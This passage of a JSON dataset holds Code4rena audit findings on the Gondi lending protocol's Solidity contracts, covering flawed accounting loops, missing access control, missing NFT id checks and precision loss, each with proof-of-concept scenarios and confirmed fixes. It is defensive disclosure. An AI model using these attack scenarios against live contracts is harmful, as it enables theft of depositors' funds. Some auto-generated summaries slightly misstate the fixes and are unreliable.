(_cachedPendingQueueIndex + 1)%totalQueues`.\n\nThis is problematic in some cases:\n\n1. When `_cachedPendingQueueIndex` `<` `getMaxTotalWithdrawalQueues`.\n`_updatePendingWithdrawalWithQueue()` will always skip the oldest queue when distributing `getTotalReceived[_idx]` funds.\n\n    In `_queueClaimAll()`, [the first for-loop start with the oldestQueueIndex](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L693) (`_cachedPendingQueueIndex + 1) % totalQueues + 0)%totalQueues`). When (`_cachedPendingQueueIndex + 1`) `% totalQueues== _cachedPendingQueueIndex + 1`, this first iteration will always result in a break in the [second for-loop](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L662), where `secondIdx == oldestQueueIndex == _cachedPendingQueueIndex + 1`.\n\n    As a result, any received funds from the `oldesQueueIndex` ([`getTotalReceived\\[oldestQueueIndex\\]`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L648)) will not be distributed and directly [deleted](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L654) (`getTotalReceived[_idx] = 0;`).\n\n2. When `_cachedPendingQueueIndex` `==` `getMaxTotalWithdrawalQueues`\nThe [second for-loop](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L662) will never break, because `secondIdx < _cachedPendingQueueIndex + 1`. `for (uint256 i; i < totalQueues;)` will always run `getMaxTotalWithdrawalQueues+1` times. This will result in received funds from any queues being distributed to both newer queues and older queues.\n\n### Recommended Mitigation Steps\n\nBased on my understanding, this should be `if (i≠0 && secondIdx == (_cachedPendingQueueIndex + 1)%totalQueues) { break;}`\n\n### Assessed type\n\nError\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/47#issuecomment-2063430859):**\n > > causing received funds to be added to the wrong queues\n> \n> What are the consequences of that? I'll might consider high severity if this leads to frozen funds.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/47#issuecomment-2067281634):**\n > Conversation continued over discord. There's a bug here I believe (a high severity one), the condition for breaking the loop should be `secondIdx == _cachedPendingQueueIndex`.\n\n**[0xA5DF (judge) increased severity to High](https://github.com/code-423n4/2024-04-gondi-findings/issues/47#issuecomment-2068017566)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Need to break 1 before.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/48), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/57) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/9).\n\n***\n\n",
      "summary": "\nSummary: The `queueClaimAll` function in Pool.sol is intended to distribute received funds to newer queues, but due to a bug in the code, the oldest queue is skipped and the funds are not distributed correctly. This can result in lost or frozen funds. The severity of this bug has been assessed as high and a mitigation has been implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/47",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35209",
      "title": "[H-07] `deployWithdrawalQueue()` need to clear `_queueAccounting[lastQueueIndex]`",
      "impact": "HIGH",
      "content": "\nIn `deployWithdrawalQueue()`, only clears `_queueOutstandingValues[lastQueueIndex]` and `_outstandingValues`, but doesn't clear `_queueAccounting[lastQueueIndex]`.\n\n```solidity\n    function deployWithdrawalQueue() external nonReentrant {\n...\n\n        /// @dev We move outstanding values from the pool to the queue that was just deployed.\n        _queueOutstandingValues[pendingQueueIndex] = _outstandingValues;\n        /// @dev We clear values of the new pending queue.\n        delete _queueOutstandingValues[lastQueueIndex];\n        delete _outstandingValues;\n@>      //@audit miss delete _queueAccounting[lastQueueIndex]\n\n        _updateLoanLastIds();\n\n@>      _pendingQueueIndex = lastQueueIndex;\n\n        // Cannot underflow because the sum of all withdrawals is never larger than totalSupply.\n        unchecked {\n            totalSupply -= sharesPendingWithdrawal;\n        }\n    }\n\n```\n\nAfter this method, anyone calling `queueClaimAll()` will use this stale data `_queueAccounting[lastQueueIndex]`.\n\n`queueClaimAll()` -> `_queueClaimAll(_pendingQueueIndex)`-> `_updatePendingWithdrawalWithQueue(_pendingQueueIndex)`\n\n```solidity\n    function _updatePendingWithdrawalWithQueue(\n        uint256 _idx,\n        uint256 _cachedPendingQueueIndex,\n        uint256[] memory _pendingWithdrawal\n    ) private returns (uint256[] memory) {\n        uint256 totalReceived = getTotalReceived[_idx];\n        uint256 totalQueues = getMaxTotalWithdrawalQueues + 1;\n        /// @dev Nothing to be returned\n        if (totalReceived == 0) {\n            return _pendingWithdrawal;\n        }\n        getTotalReceived[_idx] = 0;\n\n        /// @dev We go from idx to newer queues. Each getTotalReceived is the total\n        /// returned from loans for that queue. All future queues/pool also have a piece of it.\n        /// X_i: Total received for queue `i`\n        /// X_1  = Received * shares_1 / totalShares_1\n        /// X_2 = (Received - (X_1)) * shares_2 / totalShares_2 ...\n        /// Remainder goes to the pool.\n        for (uint256 i; i < totalQueues;) {\n            uint256 secondIdx = (_idx + i) % totalQueues;\n@>          QueueAccounting memory queueAccounting = _queueAccounting[secondIdx];\n            if (queueAccounting.thisQueueFraction == 0) {\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n            /// @dev We looped around.\n@>          if (secondIdx == _cachedPendingQueueIndex + 1) {\n                break;\n            }\n            uint256 pendingForQueue = totalReceived.mulDivDown(queueAccounting.thisQueueFraction, PRINCIPAL_PRECISION);\n            totalReceived -= pendingForQueue;\n\n            _pendingWithdrawal[secondIdx] = pendingForQueue;\n            unchecked {\n                ++i;\n            }\n        }\n        return _pendingWithdrawal;\n    }\n```\n\n### Impact\n\nNot clearing `_queueAccounting[lastQueueIndex]` when executing `queueClaimAll()` will use this stale data to distribute `totalReceived`.\n\n### Recommended Mitigation\n\n```diff\n    function deployWithdrawalQueue() external nonReentrant {\n...\n\n        /// @dev We move outstaning values from the pool to the queue that was just deployed.\n        _queueOutstandingValues[pendingQueueIndex] = _outstandingValues;\n        /// @dev We clear values of the new pending queue.\n        delete _queueOutstandingValues[lastQueueIndex];\n+       delete _queueAccounting[lastQueueIndex]\n        delete _outstandingValues;\n\n\n        _updateLoanLastIds();\n\n        _pendingQueueIndex = lastQueueIndex;\n\n        // Cannot underflow because the sum of all withdrawals is never larger than totalSupply.\n        unchecked {\n            totalSupply -= sharesPendingWithdrawal;\n        }\n    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/48#event-12543494424)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Clear state vars.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/47), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/56) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/8).\n\n***\n\n",
      "summary": "\nThe report is about a bug in the `deployWithdrawalQueue()` function. The function clears some variables but misses one variable called `_queueAccounting[lastQueueIndex]`. This means that when another function called `queueClaimAll()` is called, it will use the old data from `_queueAccounting[lastQueueIndex]`, which can cause problems. The recommended solution is to add a line of code to clear this variable in the `deployWithdrawalQueue()` function. The bug has been confirmed and mitigated by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/48",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35208",
      "title": "[H-06] Function `settleWithBuyout()` does not call `LoanManager.loanLiquidation()` during a buyout",
      "impact": "HIGH",
      "content": "\nLenders in the Gondi protocol could be EOA and Gondi Pool. Gondi Pool, an ERC4626, allows anyone to deposit funds and earn yield from lending on Gondi. Gondi Pool implemented the `LoanManager` interfaces, which include the `validateOffer()`, `loanRepayment()`, and `loanLiquidation()` functions. The functions `loanRepayment()` and `loanLiquidation()` are called when a borrower repays the loan or the loan is liquidated, i.e., when the Pool receives funds back from `MultiSourceLoan`. Both functions is used to update the queue accounting and the outstanding values of the Pool.\n\n```solidity\nERC20 asset = ERC20(_auction.asset); \nuint256 totalOwed;\n// @audit Repay lender but not call LoanManager.loanLiquidation()\nfor (uint256 i; i < _loan.tranche.length;) {\n    if (i != largestTrancheIdx) { \n        IMultiSourceLoan.Tranche calldata thisTranche = _loan.tranche[i];\n        uint256 owed = thisTranche.principalAmount + thisTranche.accruedInterest\n            + thisTranche.principalAmount.getInterest(thisTranche.aprBps, block.timestamp - thisTranche.startTime);\n        totalOwed += owed; \n        asset.safeTransferFrom(msg.sender, thisTranche.lender, owed);\n    }\n    unchecked {\n        ++i;\n    }\n}\nIMultiSourceLoan(_auction.loanAddress).loanLiquidated(_auction.loanId, _loan);\n```\n\nIn the `settleWithBuyout()` function, the main lender buys out the loan by repaying all other lenders directly. However, `loanLiquidation()` is not called, leading to incorrect accounting in the Pool.\n\n### Proof of Concept\n\nThe `loanLiquidation()` function handles accounting in the pool.\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L449-L463>\n\n```solidity\nfunction loanLiquidation(\n    ...\n) external override onlyAcceptedCallers {\n    uint256 netApr = _netApr(_apr, _protocolFee);\n    uint256 interestEarned = _principalAmount.getInterest(netApr, block.timestamp - _startTime);\n    uint256 fees = IFeeManager(getFeeManager).processFees(_received, 0);\n    getCollectedFees += fees;\n    _loanTermination(msg.sender, _loanId, _principalAmount, netApr, interestEarned, _received - fees);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider checking and calling `loanLiquidation()` in `settleWithBuyout()` to ensure accurate accounting in the pool.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/49#issuecomment-2067756607):**\n > Changing interest paid to use the end of the loan (this appears in another issue since this delta in time otherwise breaks the `maxSeniorRepayment` concept).\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added `loanLiquidation` call.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/46), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/55) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/7).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue in the Gondi protocol where the `loanLiquidation()` function is not being called, leading to incorrect accounting in the Gondi Pool. This function is important for updating the queue accounting and outstanding values of the Pool. The bug occurs in the `settleWithBuyout()` function, where the main lender repays all other lenders directly. The recommended mitigation is to check and call `loanLiquidation()` in `settleWithBuyout()` to ensure accurate accounting in the Pool. The bug has been confirmed and mitigated by the Gondi team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/49",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen"
      ]
    },
    {
      "id": "35207",
      "title": "[H-05] `triggerFee` is stolen from other auctions during `settleWithBuyout()`",
      "impact": "HIGH",
      "content": "\nThe function `settleWithBuyout()` is used to settle an auction with a buyout from the main lender. This lender needs to repay all other lenders and will receive the NFT collateral. Near the end of the function, the `triggerFee` is also paid to the auction originator. However, the funds used to pay this fee are taken directly from the contract balance, even though the main lender doesn't transfer these funds into the contract.\n\n```solidity\nfunction settleWithBuyout(\n    ...\n) external nonReentrant {\n    ...\n    // @note Repay other lenders\n    ERC20 asset = ERC20(_auction.asset); \n    uint256 totalOwed;\n    for (uint256 i; i < _loan.tranche.length;) {\n        ...\n    }\n    IMultiSourceLoan(_auction.loanAddress).loanLiquidated(_auction.loanId, _loan);\n    \n    // @audit There is no fund in this contract to pay triggerFee\n    asset.safeTransfer(_auction.originator, totalOwed.mulDivDown(_auction.triggerFee, _BPS)); \n    ...\n}\n```\n\nAs a result, if the auction contract balance is insufficient to cover the fee, the function will simply revert and prevent the main lender from buying out. In other cases where multiple auctions are running in parallel, the `triggerFee` will be deducted from the other auctions. This could lead to the last auctions being unable to settle due to insufficient balance.\n\n### Proof of Concept\n\nThe function `settleWithBuyout()` is called before any `placeBid()` so the funds is only from main lender. In the `settleWithBuyout()`, there are 2 transfers asset. One is to pay other lenders and one is to pay the `triggerFee`. As you can see in the code snippet, there is no `triggerFee` transfer from sender to originator.\n\n### Recommended Mitigation Steps\n\nConsider using `safeTransferFrom()` to pay the `triggerFee` from the sender's address, rather than using `safeTransfer()` to pay the `triggerFee` from the contract balance.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/50#event-12543486840)**\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/50#issuecomment-2067722171):**\n > Sustaining high severity because this is going to cause a loss of principal to other auctions.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Change to `safeTransferFrom` buyer.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/45), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/54) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/6).\n\n***\n\n",
      "summary": "\nThe `settleWithBuyout()` function in the code is used to settle an auction by paying off other lenders and transferring the NFT collateral to the main lender. However, there is a bug in the code where the `triggerFee` is paid from the contract balance instead of the main lender's funds. This can result in the main lender being unable to buy out the auction if there are insufficient funds in the contract balance. This can also affect other auctions running at the same time, causing them to be unable to settle due to insufficient balance. To fix this, the code should be updated to use `safeTransferFrom()` to pay the `triggerFee` from the main lender's address. The severity of this bug is considered high and has been mitigated by changing the code in the `safeTransferFrom` function. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/50",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen"
      ]
    },
    {
      "id": "35206",
      "title": "[H-04] Function `refinanceFromLoanExecutionData()` does not check `executionData.tokenId == loan.nftCollateralTokenId`",
      "impact": "HIGH",
      "content": "\nThe `refinanceFromLoanExecutionData()` function is used to refinance a loan from `LoanExecutionData`. It allows borrowers to use outstanding offers for new loans to refinance their current loan. This function essentially combines two actions: it processes the repayment for the previous loan and then emits a new loan.\n\nThe key difference is that the same NFT is used as collateral for the new loan, so it does not need to be transferred out of the protocol and then transferred back in. However, there is no check to ensure that the NFT id of the old loan matches the NFT id of the new execution data.\n\nTherefore, the new loan may have a collateral NFT that does not match the NFT that the lender requested in their offers.\n\n```solidity\n/// @dev We first process the incoming offers so borrower gets the capital. After that, we process repayments.\n///      NFT doesn't need to be transferred (it was already in escrow)\n(uint256 newLoanId, uint256[] memory offerIds, Loan memory loan, uint256 totalFee) =\n_processOffersFromExecutionData(\n    borrower,\n    executionData.principalReceiver,\n    principalAddress,\n    nftCollateralAddress,\n    executionData.tokenId, // @audit No check if matched with loan.nftCollateralTokenId\n    executionData.duration,\n    offerExecution\n);\n```\n\n### Proof of Concept\n\nAs we can see, `executionData.tokenId` is passed to the `_processOffersFromExecutionData()` function instead of `loan.nftCollateralTokenId`. This function performs all the checks to ensure that the lenders' offers accept this NFT.\n\n```solidity\nfunction _processOffersFromExecutionData(\n    address _borrower,\n    address _principalReceiver,\n    address _principalAddress,\n    address _nftCollateralAddress,\n    uint256 _tokenId,\n    uint256 _duration,\n    OfferExecution[] calldata _offerExecution\n) private returns (uint256, uint256[] memory, Loan memory, uint256) {\n  ...\n  _validateOfferExecution(\n      thisOfferExecution,\n      _tokenId,\n      offer.lender,\n      offer.lender,\n      thisOfferExecution.lenderOfferSignature,\n      protocolFee.fraction,\n      totalAmount\n  );\n  ...\n}\n```\n\nEventually, it calls the `_checkValidators()` function to check the NFT token ID.\n\n```solidity\nfunction _checkValidators(LoanOffer calldata _loanOffer, uint256 _tokenId) private {\n    uint256 offerTokenId = _loanOffer.nftCollateralTokenId;\n    if (_loanOffer.nftCollateralTokenId != 0) {\n        if (offerTokenId != _tokenId) {\n            revert InvalidCollateralIdError();\n        }\n    } else {\n        uint256 totalValidators = _loanOffer.validators.length;\n        if (totalValidators == 0 && _tokenId != 0) {\n            revert InvalidCollateralIdError();\n        } else if ((totalValidators == 1) && (_loanOffer.validators[0].validator == address(0))) {\n            return;\n        }\n        for (uint256 i = 0; i < totalValidators;) {\n            IBaseLoan.OfferValidator memory thisValidator = _loanOffer.validators[i];\n            IOfferValidator(thisValidator.validator).validateOffer(_loanOffer, _tokenId, thisValidator.arguments);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}\n```\n\nHowever, since `executionData.tokenId` is passed in, an attacker could pass in a valid `tokenId` (an NFT id that will be accepted by all lender offers). But in reality, the `loan.nftCollateralTokenId` will be the NFT kept in escrow.\n\n### Recommended Mitigation Steps\n\nAdd a check to ensure that `executionData.tokenId` is equal to `loan.nftCollateralTokenId`.\n\n### Assessed type\n\nInvalid Validation\n\n**[0xend (Gondi) confirmed via duplicate Issue #14](https://github.com/code-423n4/2024-04-gondi-findings/issues/14#event-12543529247)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added `tokenIdCheck`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/44), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/53) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/5).\n\n***\n\n",
      "summary": "\nThe `refinanceFromLoanExecutionData()` function allows borrowers to use outstanding offers for new loans to refinance their current loan. However, there is a bug where the new loan may have a different collateral NFT than the one requested by the lender. This could be exploited by an attacker to pass in a valid NFT that will be accepted by all lender offers, while the actual NFT kept in escrow will be different. The recommended mitigation step is to add a check to ensure that the NFT requested by the lender matches the one used in the new loan. This bug has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/54",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35205",
      "title": "[H-03] Function `distribute()` lacks access control allowing anyone to spam and disrupt the pool's accounting",
      "impact": "HIGH",
      "content": "\nThe `LiquidationDistributor` contract manages the distribution of funds after a liquidation auction is settled. It distributes the received funds to the lenders of the loan. If the lender has implemented the `LoanManager` interface, it will also call `loanLiquidation()` on the lender's address. The Pool, when `loanLiquidation()` is called, will conduct an accounting process to ensure that the received funds are fairly distributed to the depositors.\n\n```solidity\nfunction loanLiquidation(\n    uint256 _loanId,\n    uint256 _principalAmount,\n    uint256 _apr,\n    uint256,\n    uint256 _protocolFee,\n    uint256 _received,\n    uint256 _startTime\n) external override onlyAcceptedCallers {\n    uint256 netApr = _netApr(_apr, _protocolFee);\n    uint256 interestEarned = _principalAmount.getInterest(netApr, block.timestamp - _startTime);\n    uint256 fees = IFeeManager(getFeeManager).processFees(_received, 0);\n    getCollectedFees += fees;\n    // @audit Accounting logic\n    _loanTermination(msg.sender, _loanId, _principalAmount, netApr, interestEarned, _received - fees);\n}\n```\n\nHowever, the `distribute()` function lacks access control. Consequently, an attacker could directly call it with malicious data, leading to incorrect accounting in the Pool.\n\n### Proof of Concept\n\nObserve how the `loanLiquidation()` function is called:\n\n```solidity\nfunction _handleLoanManagerCall(IMultiSourceLoan.Tranche calldata _tranche, uint256 _sent) private {\n    if (getLoanManagerRegistry.isLoanManager(_tranche.lender)) {\n        LoanManager(_tranche.lender).loanLiquidation(\n            _tranche.loanId,\n            _tranche.principalAmount,\n            _tranche.aprBps,\n            _tranche.accruedInterest,\n            0,\n            _sent,\n            _tranche.startTime\n        );\n    }\n}\n```\n\nAs shown above, the `principalAddress` is not passed in, meaning it will not be validated by the Pool. Therefore, an attacker can simply call the `distribute()` function with `loan.principalAddress` set to a random ERC20 token. This token will still be transferred to the Pool. However, the Pool will mistake this token as its asset token (USDC/WETH) and perform the accounting accordingly.\n\n### Recommended Mitigation Steps\n\nOnly allow Loan contracts to call the `distribute()` function.\n\n### Assessed type\n\nAccess Control\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/64#event-12543191121)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added caller check to avoid anyone calling `distribute`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/43), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/52) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/4).\n\n***\n\n",
      "summary": "\nThe `LiquidationDistributor` contract is responsible for distributing funds to lenders after a liquidation auction. However, there is a bug that allows an attacker to manipulate the accounting process and receive incorrect funds. This is due to a lack of access control in the `distribute()` function. The recommended mitigation is to only allow loan contracts to call this function. The issue has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/64",
      "tags": [],
      "finders": [
        "zhaojie",
        "minhquanym"
      ]
    },
    {
      "id": "35204",
      "title": "[H-02] Division before multiplication could lead to users losing 50% in `WithdrawalQueue`",
      "impact": "HIGH",
      "content": "\nIn the `_getAvailable()` function, the calculation performs division before multiplication, which could result in precision loss. The consequence is that users may not be able to withdraw the amount they should receive, leaving some funds locked in the `WithdrawalQueue`.\n\n```solidity\n// @audit division before multiplication\nfunction _getAvailable(uint256 _tokenId) private view returns (uint256) {\n    return getShares[_tokenId] * _getWithdrawablePerShare() - getWithdrawn[_tokenId]; \n}\n\n/// @notice Get the amount that can be withdrawn per share.\nfunction _getWithdrawablePerShare() private view returns (uint256) {\n    return (_totalWithdrawn + _asset.balanceOf(address(this))) / getTotalShares;\n}\n```\n\n### Proof of Concept\n\nConsider the following scenario:\n\n```solidity\ngetShares[_tokenId] = 1e8\ngetWithdrawn[_tokenId] = 0\n_totalWithdrawn = 0\n_asset.balanceOf(address(this)) = 1e9 (1000 USDC)\ngetTotalShares = 5e8 + 1\n```\n\nThe current calculation will yield:\n\n```solidity\n_getWithdrawablePerShare() = 1e9 / (5e8 + 1) = 1\n_getAvailable() = 1e8 * 1 - 0 = 1e8 = 100000000\n```\n\nHowever, the users should actually receive:\n\n```solidity\ngetShares[_tokenId] * _asset.balanceOf(address(this)) / getTotalShares\n= 1e8 * 1e9 / (5e8 + 1) = 199999999\n```\n\nAs shown, the users lose almost 50% of what they should receive.\n\n### Recommended Mitigation Steps\n\nChange the order of calculation to multiply before division.\n\n### Assessed type\n\nMath\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/67#event-12543163376)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Change order in multiplication/division as suggested.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/42), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/51) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/3).\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `_getAvailable()` which is used to calculate the amount of funds that can be withdrawn by users. The issue is that the function performs division before multiplication, which can result in a loss of precision. This means that users may not be able to withdraw the correct amount, leaving some funds locked in the `WithdrawalQueue`. \n\nTo illustrate this issue, a scenario is provided where the calculation results in a loss of almost 50% of the expected amount. To fix this, it is recommended to change the order of calculation to multiply before dividing. This bug falls under the category of \"Math\" and has been confirmed and mitigated by the team.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/67",
      "tags": [],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "35203",
      "title": "[H-01] Merging tranches could make `_loanTermination()` accounting incorrect",
      "impact": "HIGH",
      "content": "\nIn the `Pool` contract, when a loan is repaid or liquidated, a call to the Pool is made for accounting. The `_loanTermination()` function is eventually invoked. This function uses the `loanId` to determine the withdrawal queue to which the loan belongs. If the loan was issued after the last queue, it belongs entirely to the pool, and `_outstandingValues` is updated. If not, it updates the queue accounting, queue outstanding values, `getTotalReceived` and `getAvailableToWithdraw`.\n\n```solidity\nfunction _loanTermination(\n    ...\n) private {\n    uint256 pendingIndex = _pendingQueueIndex;\n    uint256 totalQueues = getMaxTotalWithdrawalQueues + 1;\n    uint256 idx;\n    /// @dev oldest queue is the one after pendingIndex\n    uint256 i;\n    for (i = 1; i < totalQueues;) {\n        idx = (pendingIndex + i) % totalQueues;\n        if (getLastLoanId[idx][_loanContract] >= _loanId) {\n            break;\n        }\n        unchecked {\n            ++i;\n        }\n    }\n    /// @dev We iterated through all queues and never broke, meaning it was issued after the newest one.\n    if (i == totalQueues) {\n        _outstandingValues =\n            _updateOutstandingValuesOnTermination(_outstandingValues, _principalAmount, _apr, _interestEarned);\n        return;\n    } else {\n        uint256 pendingToQueue =\n            _received.mulDivDown(PRINCIPAL_PRECISION - _queueAccounting[idx].netPoolFraction, PRINCIPAL_PRECISION);\n        getTotalReceived[idx] += _received;\n        getAvailableToWithdraw += pendingToQueue;\n        _queueOutstandingValues[idx] = _updateOutstandingValuesOnTermination(\n            _queueOutstandingValues[idx], _principalAmount, _apr, _interestEarned\n        );\n    }\n}\n```\n\nHowever, the `mergeTranches()` function is permissionless and only requires the merged tranches to be contiguous. Once tranches are merged, the `loanId` of the new tranche changes, which can lead to incorrect accounting in the `Pool`.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n1. A borrower opens a loan and takes liquidity from multiple offers of the same Pool. The loan has the parameters `loanId = 100`, with two tranches, both having `lender = pool_address`.\n2. In the Pool, assume `getLastLoanId[1][loan] = 100`, indicating that queue index 1 points to the latest loanId in the `loan` contract.\n3. An attacker calls `mergeTranches()` to merge the two tranches of `loanId = 100` with the same lender, which is the pool address. The new `newLoanId = 101` is used in the new tranche.\n4. Now, when the loan is repaid, the `_loanTermination()` function is invoked with `_loanId = 101`. The loop returns `i == totalQueues`, making the loan belong entirely to the pool, while it should belong to withdrawal queue index 1.\n\n[MultiSourceLoan.sol#L1132-L1140](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L1132-L1140)\n\n```solidity\ntranche[_minTranche] = IMultiSourceLoan.Tranche(\n    _newLoanId, // @audit can be used to change loanId\n    _loan.tranche[_minTranche].floor,\n    principalAmount,\n    lender,\n    accruedInterest,\n    startTime,\n    cumAprBps / principalAmount\n);\n```\n\n### Recommended Mitigation Steps\n\nLimit the ability to call `mergeTranches()` directly to lenders only.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/69#event-12543124405)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Only tranche lender can call `mergeTranches` so it assumes the responsibility.\n\n**Status:** Mitigation confirmed. Full details in reports from [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/50) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/2).\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the `Pool` contract where incorrect accounting can occur when a loan is repaid or liquidated. This is due to the `mergeTranches()` function being permissionless and allowing for incorrect loan IDs to be used. This can lead to incorrect accounting in the `Pool` contract. The recommended mitigation is to limit the ability to call `mergeTranches()` to only lenders. The bug has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/69",
